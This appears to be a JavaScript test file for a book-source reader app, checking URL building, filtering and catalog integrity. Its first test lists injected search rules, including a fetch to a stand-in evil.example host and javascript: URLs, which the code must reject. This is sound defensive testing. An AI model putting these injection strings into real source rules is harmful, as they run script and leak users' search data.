import test from 'node:test';
import assert from 'node:assert/strict';
import {readFile} from 'node:fs/promises';
import {searchUrl,filterSources,readSaved,safeWebUrl} from '../public/newsstand-data.js';
const catalog=JSON.parse(await readFile(new URL('../public/newsstand-catalog.json',import.meta.url),'utf8'));
test('source search only navigates safe literal GET pages, never evaluates executable rules',()=>{
 const source={url:'https://books.example/',search:'/search?q={{key}}&page={{page}}'};
 assert.equal(searchUrl(source,'山海 & #记'),'https://books.example/search?q=%E5%B1%B1%E6%B5%B7%20%26%20%23%E8%AE%B0&page=1');
 for(const search of ['@js:fetch("https://evil.example/?q={{key}}")','<js>danger()</js>?q={{key}}','/search, {"method":"POST","body":"q={{key}}"}','javascript:alert("{{key}}")','/search?q={{key}}&page={{page-1}}','/api/search?q={{key}}','/search/data.json?q={{key}}'])assert.equal(searchUrl({...source,search},'test'),null,search);
 assert.equal(safeWebUrl('https://user:password@books.example/'),null);
 assert.equal(safeWebUrl('data:text/html,test'),null);
});
test('category and keyword filters compose and damaged local storage is recoverable',()=>{
 const novel=catalog.sources.find(s=>s.category==='novel');
 assert.deepEqual(filterSources(catalog.sources,{category:'saved',saved:[novel.id],query:novel.title}),[novel]);
 assert.deepEqual(filterSources(catalog.sources,{category:'comic',query:novel.title}),[]);
 assert.deepEqual(readSaved({getItem(){throw Error('blocked');}}),[]);
 assert.deepEqual(readSaved({getItem(){return '{bad';}}),[]);
 assert.deepEqual(readSaved({getItem(){return '"not an array"';}}),[]);
});
test('each curated source resolves to its own intact Legado definition',async()=>{
 assert.equal(catalog.sources.length,24);
 assert.equal(new Set(catalog.sources.map(s=>s.id)).size,24);
 for(const source of catalog.sources){
  const data=JSON.parse(await readFile(new URL(`../public/newsstand-sources/${source.id}.json`,import.meta.url),'utf8'));
  assert.equal(data.length,1);assert.equal(data[0].bookSourceName,source.name);
  assert.equal(new URL(data[0].bookSourceUrl.trim()).hostname,new URL(source.url).hostname);
  assert.equal(data[0].searchUrl||'',source.search);
 }
});
